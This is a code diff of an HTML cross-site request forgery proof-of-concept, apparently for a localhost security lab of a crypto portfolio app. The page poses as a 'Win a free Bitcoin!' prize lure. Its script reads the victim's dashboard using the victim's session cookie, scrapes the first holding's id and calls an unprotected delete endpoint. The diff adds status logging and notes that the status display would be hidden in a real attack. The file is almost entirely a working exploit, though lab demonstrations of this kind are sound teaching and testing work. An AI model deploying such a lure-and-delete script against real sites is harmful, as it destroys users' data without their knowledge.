@@ -2,44 +2,73 @@
 <!--
   csrf_delete.html — CSRF proof-of-concept (delete a victim's FIRST holding)
 
-  Demo: a logged-in victim opens this page. Instead of a hardcoded id, the
-  attacker JS first fetches the victim's own dashboard (their session cookie
-  rides along), scrapes the id of the *first* holding in the table, then fires
-  delete_holding.php?id=<that id>. So it always deletes the top holding, whatever
-  it is — no need to know an id in advance.
+  A logged-in victim opens this page. The attacker JS fetches the victim's own
+  dashboard (their session cookie rides along), scrapes the id of the *first*
+  holding, then fires delete_holding.php?id=<that id>. No hardcoded id — it
+  always deletes whatever the top holding is.
 
-  Why the read step works in this lab: the attacker files are served from the
-  same origin as the app (http://localhost/crypto-tracker/attacker/... — see
-  DEPLOY_KALI_APACHE.md), so the fetch is same-origin and the response is
-  readable. delete_holding.php then accepts a plain GET with no CSRF token, so
-  the deletion goes through on the victim's session.
+  IMPORTANT — serve this from the SAME ORIGIN as the app:
+      http://localhost/crypto-tracker/attacker/csrf_delete.html
+  The read-the-dashboard step is a same-origin fetch. If you open this as a
+  bare file:// (double-click) or from a different host/port, the browser blocks
+  the read and nothing gets deleted. The on-page status below tells you which
+  happened, so it is never a silent failure.
 -->
 <html>
-<head><meta charset="utf-8"><title>Win a free Bitcoin! 🎉</title></head>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="Cache-Control" content="no-store">
+  <title>Win a free Bitcoin! 🎉</title>
+</head>
 <body>
   <h1>Congratulations — you won! 🎁</h1>
   <p>Loading your prize...</p>
 
+  <!-- Visible status so you can SEE what the exploit did (hide in a real attack). -->
+  <pre id="status" style="background:#111;color:#0f0;padding:12px;font:13px monospace;white-space:pre-wrap"></pre>
+
   <script>
-    // Point this at the app's base URL.
     var APP = 'http://localhost/crypto-tracker';
+    var out = document.getElementById('status');
+    function log(msg) { out.textContent += msg + '\n'; }
 
     // VULN target: CSRF + IDOR on delete_holding.php (plain GET, no token).
     (async function () {
+      // Same-origin guard: the read step only works when served under the app's
+      // own origin. Warn loudly instead of failing silently.
+      if (location.origin !== APP.replace(/\/crypto-tracker$/, '')) {
+        log('[!] This page is on ' + location.origin + ', not ' + APP.replace(/\/crypto-tracker$/, '') + '.');
+        log('[!] The dashboard read will be blocked. Serve it from:');
+        log('    ' + APP + '/attacker/csrf_delete.html');
+      }
+
       try {
         // 1. Read the victim's dashboard using their live session.
-        var html = await fetch(APP + '/dashboard.php', { credentials: 'include' })
+        //    Cache-bust so we never parse a stale copy.
+        log('[*] Reading victim dashboard...');
+        var html = await fetch(APP + '/dashboard.php?_=' + Date.now(), { credentials: 'include' })
                           .then(function (r) { return r.text(); });
+
+        if (/name="username"/.test(html) || /Log in/.test(html)) {
+          log('[!] Victim is NOT logged in — nothing to delete. Log in first.');
+          return;
+        }
 
         // 2. Scrape the id of the first holding (first Del link in the table).
         var m = html.match(/delete_holding\.php\?id=(\d+)/);
-        if (!m) { return; }               // nothing to delete
+        if (!m) {
+          log('[!] No holdings found on the dashboard — nothing to delete.');
+          return;
+        }
         var id = m[1];
+        log('[+] First holding id = ' + id + ' -> deleting...');
 
         // 3. Fire the delete on the victim's session.
-        var img = new Image();
-        img.src = APP + '/delete_holding.php?id=' + id;
-      } catch (e) { /* stay silent — victim sees nothing */ }
+        await fetch(APP + '/delete_holding.php?id=' + id, { credentials: 'include' });
+        log('[+] Done. Reload the victim dashboard — holding ' + id + ' is gone.');
+      } catch (e) {
+        log('[!] Failed: ' + e + ' (are you serving this from ' + APP + '/attacker/ ?)');
+      }
     })();
   </script>
 </body>
